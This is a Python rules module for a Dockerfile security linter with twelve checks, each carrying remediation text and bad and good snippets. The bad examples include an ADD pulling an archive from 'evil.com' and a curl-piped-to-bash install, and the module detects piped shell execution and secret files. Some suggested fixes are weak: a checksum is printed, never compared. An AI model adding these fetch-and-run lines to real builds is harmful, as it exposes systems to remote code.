# rules.py — All Dockerfile security rules with full remediation

def check_no_root_user(content):
    has_user = any(
        line.get('instruction', '').upper() == 'USER'
        for line in content
    )
    if not has_user:
        return {
            'rule': 'Rule 1 — No root user directive',
            'severity': 'Critical',
            'stride': 'Elevation of Privilege',
            'detail': 'No USER instruction found. Container runs as root by default.',
            'fix': 'Add USER nonroot before the CMD/ENTRYPOINT line.',
            'bad_code': 'FROM ubuntu:22.04\nRUN apt-get install nginx\n# no USER directive',
            'good_code': 'FROM ubuntu:22.04\nRUN apt-get install nginx\nUSER nginx',
            'why': 'If an attacker escapes the container, they get root on the host machine.',
            'sdlc_phase': 'Implementation'
        }
    return None


def check_no_hardcoded_secrets(content):
    keywords = ['password', 'secret', 'api_key', 'token', 'passwd', 'pwd']
    for line in content:
        if line.get('instruction', '').upper() == 'ENV':
            value = str(line.get('value', '')).lower()
            for kw in keywords:
                if kw in value and '=' in str(line.get('value', '')):
                    return {
                        'rule': 'Rule 2 — Hardcoded secret in ENV',
                        'severity': 'Critical',
                        'stride': 'Information Disclosure',
                        'detail': f'Possible secret found in ENV: {line.get("value", "")}',
                        'fix': 'Use Docker secrets or environment variables at runtime instead.',
                        'bad_code': 'ENV DB_PASSWORD=admin123\nENV API_KEY=sk-abc123',
                        'good_code': 'ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# pass at runtime: docker run -e DB_PASSWORD=xxx',
                        'why': 'Secrets in ENV are visible in docker inspect, image history, and any registry.',
                        'sdlc_phase': 'Implementation'
                    }
    return None


def check_no_ssh_port(content):
    for line in content:
        if line.get('instruction', '').upper() == 'EXPOSE':
            if '22' in str(line.get('value', '')):
                return {
                    'rule': 'Rule 3 — SSH port 22 exposed',
                    'severity': 'Critical',
                    'stride': 'Spoofing',
                    'detail': 'Port 22 is exposed. Containers should not allow SSH access.',
                    'fix': 'Remove EXPOSE 22 from your Dockerfile.',
                    'bad_code': 'EXPOSE 22\nEXPOSE 80',
                    'good_code': 'EXPOSE 80\n# never expose port 22',
                    'why': 'SSH inside containers expands attack surface and violates container design principles.',
                    'sdlc_phase': 'Design'
                }
    return None


def check_no_add_command(content):
    for line in content:
        if line.get('instruction', '').upper() == 'ADD':
            return {
                'rule': 'Rule 4 — ADD used instead of COPY',
                'severity': 'Critical',
                'stride': 'Tampering',
                'detail': f'ADD instruction found: {line.get("value", "")}',
                'fix': 'Replace ADD with COPY unless you specifically need URL fetching.',
                'bad_code': 'ADD https://evil.com/app.tar.gz /app\nADD ./src /app',
                'good_code': 'COPY ./src /app\n# use COPY for local files always',
                'why': 'ADD can fetch remote URLs and auto-extract archives creating unexpected attack surface.',
                'sdlc_phase': 'Implementation'
            }
    return None


def check_no_latest_tag(content):
    for line in content:
        if line.get('instruction', '').upper() == 'FROM':
            value = str(line.get('value', ''))
            if ':latest' in value or (':' not in value and 'scratch' not in value):
                return {
                    'rule': 'Rule 5 — Unpinned image tag',
                    'severity': 'High',
                    'stride': 'Tampering',
                    'detail': f'Unpinned or :latest tag used: {value}',
                    'fix': 'Pin to a specific version e.g. nginx:1.25.3',
                    'bad_code': 'FROM nginx:latest\nFROM python:latest',
                    'good_code': 'FROM nginx:1.25.3\nFROM python:3.11.7-slim',
                    'why': 'Supply chain attacks can replace :latest with a malicious image silently.',
                    'sdlc_phase': 'Requirements'
                }
    return None


def check_healthcheck(content):
    has_health = any(
        line.get('instruction', '').upper() == 'HEALTHCHECK'
        for line in content
    )
    if not has_health:
        return {
            'rule': 'Rule 6 — No HEALTHCHECK defined',
            'severity': 'High',
            'stride': 'Denial of Service',
            'detail': 'No HEALTHCHECK instruction found.',
            'fix': 'Add HEALTHCHECK CMD curl -f http://localhost/ || exit 1',
            'bad_code': 'FROM nginx:1.25.3\nCOPY . /app\n# no HEALTHCHECK',
            'good_code': 'FROM nginx:1.25.3\nCOPY . /app\nHEALTHCHECK --interval=30s CMD curl -f http://localhost/ || exit 1',
            'why': 'Without health checks, crashed containers keep running causing silent denial of service.',
            'sdlc_phase': 'Testing'
        }
    return None


def check_minimal_packages(content):
    for line in content:
        if line.get('instruction', '').upper() == 'RUN':
            value = str(line.get('value', ''))
            if 'apt-get install' in value and '--no-install-recommends' not in value:
                return {
                    'rule': 'Rule 7 — Packages installed without --no-install-recommends',
                    'severity': 'High',
                    'stride': 'Elevation of Privilege',
                    'detail': 'apt-get install used without --no-install-recommends.',
                    'fix': 'Use apt-get install -y --no-install-recommends <package>',
                    'bad_code': 'RUN apt-get install curl vim git',
                    'good_code': 'RUN apt-get update && apt-get install -y --no-install-recommends curl',
                    'why': 'Extra packages expand attack surface with unnecessary tools and libraries.',
                    'sdlc_phase': 'Implementation'
                }
    return None


def check_no_curl_pipe_bash(content):
    for line in content:
        if line.get('instruction', '').upper() == 'RUN':
            value = str(line.get('value', ''))
            if ('curl' in value or 'wget' in value) and \
               ('| bash' in value or '| sh' in value):
                return {
                    'rule': 'Rule 8 — curl/wget piped to shell',
                    'severity': 'High',
                    'stride': 'Tampering',
                    'detail': 'Downloading and executing scripts directly is dangerous.',
                    'fix': 'Download first, verify checksum, then execute separately.',
                    'bad_code': 'RUN curl https://get.docker.com | bash',
                    'good_code': 'RUN curl -o install.sh https://get.docker.com \\\n  && sha256sum install.sh \\\n  && bash install.sh',
                    'why': 'A compromised server can deliver malware silently through piped execution.',
                    'sdlc_phase': 'Implementation'
                }
    return None


def check_apt_update_before_install(content):
    run_commands = [
        str(line.get('value', ''))
        for line in content
        if line.get('instruction', '').upper() == 'RUN'
    ]
    for cmd in run_commands:
        if 'apt-get install' in cmd and 'apt-get update' not in cmd:
            return {
                'rule': 'Rule 9 — apt-get install without update',
                'severity': 'High',
                'stride': 'Tampering',
                'detail': 'apt-get install used without apt-get update in same RUN.',
                'fix': 'Use RUN apt-get update && apt-get install -y <package>',
                'bad_code': 'RUN apt-get install curl',
                'good_code': 'RUN apt-get update && \\\n    apt-get install -y --no-install-recommends curl && \\\n    rm -rf /var/lib/apt/lists/*',
                'why': 'Stale package cache may install outdated vulnerable package versions.',
                'sdlc_phase': 'Implementation'
            }
    return None


def check_no_sensitive_files(content):
    sensitive = ['.env', 'id_rsa', '.pem', '.key', 'credentials', 'secret']
    for line in content:
        if line.get('instruction', '').upper() in ['COPY', 'ADD']:
            value = str(line.get('value', '')).lower()
            for s in sensitive:
                if s in value:
                    return {
                        'rule': 'Rule 10 — Sensitive file copied into image',
                        'severity': 'Medium',
                        'stride': 'Information Disclosure',
                        'detail': f'Possibly sensitive file in: {line.get("value", "")}',
                        'fix': 'Add sensitive files to .dockerignore and use secrets management.',
                        'bad_code': 'COPY .env /app/.env\nCOPY id_rsa /root/.ssh/',
                        'good_code': '# add to .dockerignore:\n.env\n*.pem\nid_rsa\n# use Docker secrets instead',
                        'why': 'Secrets baked into image layers persist even after deletion commands.',
                        'sdlc_phase': 'Design'
                    }
    return None


def check_workdir(content):
    has_workdir = any(
        line.get('instruction', '').upper() == 'WORKDIR'
        for line in content
    )
    if not has_workdir:
        return {
            'rule': 'Rule 11 — No WORKDIR set',
            'severity': 'Low',
            'stride': 'Tampering',
            'detail': 'No WORKDIR instruction found. Files may land in root filesystem.',
            'fix': 'Add WORKDIR /app before your COPY and RUN instructions.',
            'bad_code': 'FROM node:18\nCOPY . .\nRUN npm install',
            'good_code': 'FROM node:18\nWORKDIR /app\nCOPY . .\nRUN npm install',
            'why': 'Without WORKDIR files land in root directory making auditing harder.',
            'sdlc_phase': 'Implementation'
        }
    return None


def check_labels(content):
    has_label = any(
        line.get('instruction', '').upper() == 'LABEL'
        for line in content
    )
    if not has_label:
        return {
            'rule': 'Rule 12 — No LABEL metadata',
            'severity': 'Low',
            'stride': 'Repudiation',
            'detail': 'No LABEL instructions found. Image has no audit trail.',
            'fix': 'Add LABEL maintainer and version to your Dockerfile.',
            'bad_code': 'FROM nginx:1.25.3\n# no labels',
            'good_code': 'FROM nginx:1.25.3\nLABEL maintainer="you@email.com"\nLABEL version="1.0"',
            'why': 'Without labels it is impossible to trace who built an image or when.',
            'sdlc_phase': 'Requirements'
        }
    return None


ALL_RULES = [
    check_no_root_user,
    check_no_hardcoded_secrets,
    check_no_ssh_port,
    check_no_add_command,
    check_no_latest_tag,
    check_healthcheck,
    check_minimal_packages,
    check_no_curl_pipe_bash,
    check_apt_update_before_install,
    check_no_sensitive_files,
    check_workdir,
    check_labels,
]


def run_all_rules(parsed_content):
    findings = []
    for rule_fn in ALL_RULES:
        result = rule_fn(parsed_content)
        if result:
            findings.append(result)
    return findings